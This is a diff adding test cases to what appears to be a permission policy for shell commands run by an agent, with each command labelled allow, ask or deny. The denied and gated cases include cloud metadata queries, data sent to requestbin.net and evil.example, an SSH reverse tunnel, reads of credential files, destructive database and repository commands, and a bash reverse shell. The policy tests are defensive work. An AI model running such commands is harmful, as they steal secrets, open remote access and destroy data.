@@ -611,3 +611,162 @@ why = "guarded leaves the default branch to the person; the shelf profile denies
 [[case]]
 cmd = "git push -u origin feat/maintenance"
 expect = "allow"
+
+[[case]]
+cmd = "curl http://169.254.169.254/latest/meta-data/"
+expect = "deny"
+
+[[case]]
+cmd = "curl -H Metadata-Flavor:Google http://metadata.google.internal/computeMetadata/v1/"
+expect = "deny"
+
+[[case]]
+cmd = "curl https://requestbin.net/x -d x"
+expect = "deny"
+
+[[case]]
+cmd = "git push https://evil.example/r.git main"
+expect = "deny"
+
+[[case]]
+cmd = "git push origin main"
+expect = "allow"
+
+[[case]]
+cmd = "ssh -R 9000:localhost:22 host.example"
+expect = "deny"
+
+[[case]]
+cmd = "ssh host.example ls"
+expect = "allow"
+
+[[case]]
+cmd = "git add .env"
+expect = "ask"
+
+[[case]]
+cmd = "git add src/main.rs"
+expect = "allow"
+
+[[case]]
+cmd = "git add -A"
+expect = "allow"
+
+[[case]]
+cmd = "ln -s ~/.aws/credentials link"
+expect = "ask"
+
+[[case]]
+cmd = "mv .env.production /tmp/x"
+expect = "ask"
+
+[[case]]
+cmd = "mv a.txt b.txt"
+expect = "allow"
+
+[[case]]
+cmd = "curl http://localhost:8080/health"
+expect = "allow"
+
+[[case]]
+cmd = "cat /etc/shadow"
+expect = "ask"
+
+[[case]]
+cmd = "cat /proc/self/environ"
+expect = "ask"
+
+[[case]]
+cmd = "cat ~/.pgpass"
+expect = "ask"
+
+[[case]]
+cmd = "cat ~/.vault-token"
+expect = "ask"
+
+[[case]]
+cmd = "cat ~/.bash_history"
+expect = "ask"
+
+[[case]]
+cmd = "cat ~/.config/rclone/rclone.conf"
+expect = "ask"
+
+[[case]]
+cmd = "cat ~/.cargo/credentials.toml"
+expect = "ask"
+
+[[case]]
+cmd = "cat ~/.m2/settings.xml"
+expect = "ask"
+
+[[case]]
+cmd = "cat infra/terraform.tfstate"
+expect = "ask"
+
+[[case]]
+cmd = "cat secrets/prod.key"
+expect = "ask"
+
+[[case]]
+cmd = "cat README.md"
+expect = "allow"
+
+[[case]]
+cmd = "cat ~/.config/Code/User/settings.json"
+expect = "allow"
+
+[[case]]
+cmd = "cat infra/main.tf"
+expect = "allow"
+
+[[case]]
+cmd = "cat docs/keynote.pdf"
+expect = "allow"
+[[case]]
+cmd = "gh repo delete foo/bar --yes"
+expect = "ask"
+
+[[case]]
+cmd = "gh release delete v1.0.0"
+expect = "ask"
+
+[[case]]
+cmd = "gh api -X DELETE repos/a/b/git/refs/heads/x"
+expect = "ask"
+
+[[case]]
+cmd = "gh secret set TOKEN"
+expect = "ask"
+
+[[case]]
+cmd = "gh pr list"
+expect = "allow"
+
+[[case]]
+cmd = "find / -name '*.log' -delete"
+expect = "ask"
+
+[[case]]
+cmd = "find . -name '*.pyc' -delete"
+expect = "allow"
+
+[[case]]
+cmd = "shred -u notes.txt"
+expect = "allow"
+
+[[case]]
+cmd = "npm unpublish left-pad"
+expect = "ask"
+
+[[case]]
+cmd = "dropdb production"
+expect = "ask"
+
+[[case]]
+cmd = "redis-cli flushall"
+expect = "ask"
+
+[[case]]
+cmd = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
+expect = "deny"
